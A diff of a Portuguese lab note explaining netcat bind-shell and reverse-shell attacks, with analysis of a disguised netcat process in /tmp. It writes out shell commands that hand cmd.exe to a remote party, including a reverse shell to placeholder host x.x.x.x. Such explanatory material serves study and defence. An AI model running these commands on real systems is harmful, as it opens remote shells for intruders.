@@ -9,7 +9,7 @@ Em um bind shell attack o computador da vítima é capaz de transmitir o executa
 Ex:
   C:\Program Files (x86)\Nmap>ncat -lvp 4444 -e cmd.exe  -> computador da vítima 
   
-  nc 192.168.56.1 4444 -> computador de ataque
+  nc x.x.x.x 4444 -> computador de ataque
   
 Na atividade o netcat abre a porta tcp 41000 e envia informações para /dev/null do computador da vitima. Além disso ele mascara o nome do programa para "freedom",é colocado no diretorio /tmp(arquivos temporários), e após executado é removido, sobrando apenas o seu processo em execução.
 
@@ -55,4 +55,13 @@ Além disso, foram realizados outros tipos de análise
 
 - Nos status do processo é possivel ver o PID dos processos pai desse processo.
 
+Além do bind shell atack, existe o reverse shell atack, onde o computador de ataque fica a espera que o computador da vítima se conecte a ele, ou seja, o computador do atacante só precisa declarar que porta ele estará escutando, e assim o computador do alvo precisa se conectar ao ip e porta do atacante, além transmitir o executável do bash ou cmd.
 
+ex:
+
+   nc -lvp 4444 -> computador de ataque 
+   
+   C:\Program Files (x86)\Nmap>ncat x.x.x.x 4444 -e cmd.exe
+
+
+  
